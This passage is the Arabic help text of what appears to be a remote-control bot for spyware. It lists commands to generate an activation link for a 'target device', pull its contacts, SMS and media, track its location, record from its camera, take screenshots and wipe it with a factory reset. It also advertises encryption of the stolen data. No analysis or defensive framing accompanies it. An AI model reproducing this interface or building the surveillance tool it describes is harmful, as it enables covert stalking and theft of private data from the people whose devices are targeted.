...
• `/help` - قائمة مختصرة بالأوامر
• `/link` - إنشاء رابط تفعيل للجهاز المستهدف
• `/devices` - عرض الأجهزة المتصلة

📱 *أوامر النسخ الاحتياطي:*
• `/contacts` - نسخ احتياطي للجهات الاتصال
• `/sms` - نسخ احتياطي للرسائل النصية
• `/media` - نسخ احتياطي للملفات الوسائطية

📍 *أوامر الموقع والمراقبة:*
• `/location` - الحصول على الموقع الحالي
• `/record` - تسجيل فيديو من الكاميرا
• `/screenshot` - التقاط لقطة شاشة

⚙️ *أوامر النظام:*
• `/reset` - إعادة تعيين المصنع (تحتاج تأكيد)
• `/confirm_reset` - تأكيد إعادة تعيين المصنع
• `/cancel_reset` - إلغاء إعادة تعيين المصنع

🔒 *ميزات الأمان:*
• تشفير AES-256-CBC لجميع البيانات
• تخزين محلي للعمليات عند انقطاع الإنترنت
...
🚀 *للبدء:* استخدم `/link` لإنشاء رابط التفعيل
"""
